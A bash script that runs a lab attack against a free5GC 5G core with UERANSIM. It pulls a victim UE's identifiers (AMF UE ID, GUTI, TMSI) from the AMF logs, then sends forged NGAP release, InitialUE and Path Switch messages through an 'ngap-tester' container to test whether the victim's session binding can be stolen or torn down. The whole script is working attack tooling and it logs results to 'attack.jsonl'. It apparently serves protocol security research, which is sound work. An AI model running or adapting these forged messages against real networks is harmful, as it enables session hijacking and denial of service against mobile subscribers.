#!/usr/bin/env bash
# Contrast: InitialUE (5G-S-TMSI) vs Path Switch as binding-acquisition.
# Assumes free5GC + UERANSIM already up with an ACTIVE CM-CONNECTED UE.
# Usage: from ngap_tester/: bash pcap/initue_vs_pathswitch_free5gc/run_contrast.sh
set -uo pipefail
cd "$(dirname "$0")/../.."
ABS="$(pwd)/pcap/initue_vs_pathswitch_free5gc"
mkdir -p "$ABS"
AMF=f5gc-amf; UE=ueransim-free5gc-ueransim-ue-1; NET=net-5glab
fire(){ MSYS_NO_PATHCONV=1 docker run --rm --network "$NET" -v "$ABS:/evidence" ngap-tester \
  --config config/free5gc.json --evidence /evidence/attack.jsonl "$@" 2>&1 | sed 's/^/  /'; }
amf_since(){ docker logs "$AMF" 2>&1 | tail -n +"$(( $1 + 1 ))"; }

V=$(docker logs "$AMF" 2>&1 | grep -oE 'AU:[0-9]+' | tail -1 | grep -oE '[0-9]+')
GUTI=$(docker logs "$AMF" 2>&1 | grep -oE 'guti:[0-9a-f]+' | tail -1 | sed 's/guti://')
AMFID=${GUTI:5:6}
TMSI=${GUTI:11:8}
AMFID_INT=$((16#$AMFID))
SET=$(( (AMFID_INT >> 6) & 0x3FF ))
PTR=$(( AMFID_INT & 0x3F ))
echo "victim AU=$V GUTI=$GUTI set=$SET(0x$(printf '%x' "$SET")) ptr=$PTR tmsi=$TMSI"

echo "=== PHASE0 standalone release (expect REJECT) ==="
MARK=$(docker logs "$AMF" 2>&1 | wc -l | tr -d ' ')
fire ue-release --amf-ue-id "$V" --ran-ue-id 99
sleep 2
amf_since "$MARK" | grep -iE 'not in Ran|Release Command|ErrorIndication' | tail -5 | sed 's/^/  [amf0] /'

echo "=== PHASE1 InitialUE with victim 5G-S-TMSI (CM-CONNECTED) ==="
MARK=$(docker logs "$AMF" 2>&1 | wc -l | tr -d ' ')
fire initial-ue --ran-ue-id 99 --amf-set-id "$SET" --amf-pointer "$PTR" --tmsi "$TMSI"
sleep 3
amf_since "$MARK" | grep -iE 'InitialUE|5G-S-TMSI|find AmfUe|New AmfUe|New RanUe|Holding|Implicit|Attach|nas|Security|Release|AU:' | tail -40 | sed 's/^/  [amf1] /'

echo "=== PHASE2 release OLD AU=$V after InitialUE (expect REJECT if no steal) ==="
MARK=$(docker logs "$AMF" 2>&1 | wc -l | tr -d ' ')
fire ue-release --amf-ue-id "$V" --ran-ue-id 99
sleep 2
amf_since "$MARK" | grep -iE 'not in Ran|Release Command|ErrorIndication|Switch to new Ran' | tail -8 | sed 's/^/  [amf2] /'

echo "=== PHASE3 Path Switch same AU=$V (expect ACK if binding intact) ==="
MARK=$(docker logs "$AMF" 2>&1 | wc -l | tr -d ' ')
fire path-switch --source-amf-ue-id "$V" --ran-ue-id 99
sleep 2
amf_since "$MARK" | grep -iE 'Switch to new Ran|PathSwitch|Failure|AU:' | tail -10 | sed 's/^/  [amf3] /'
PING=$(docker exec "$UE" ping -I uesimtun0 -c 3 -W 2 8.8.8.8 2>/dev/null | grep -oE '[0-9]+% packet loss' | head -1)
echo "=== DONE AU=$V TMSI=$TMSI post-ping=$PING ==="
